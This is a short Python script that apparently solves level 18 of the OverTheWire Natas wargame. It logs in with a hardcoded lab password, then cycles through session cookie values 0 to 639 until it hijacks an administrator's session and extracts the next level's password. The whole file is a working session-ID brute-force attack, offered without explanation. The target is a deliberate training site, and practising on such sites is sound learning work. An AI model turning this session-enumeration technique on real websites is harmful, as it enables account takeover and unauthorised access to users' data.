import requests
import re
import string
import time


username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

for i in range(640):
	print("Trying the id:" + str(i))
	response = session.post(url,auth=(username,password),data={'username':'admin','password':'pass'},cookies={'PHPSESSID': str(i)})
	if "You are logged in as a regular user" not in response.text:
		password = re.findall("Username: natas19\nPassword: (.*)</pre>",response.text)[0]
		break

print("="*50)
print("\nThe password for the next level is: " + password)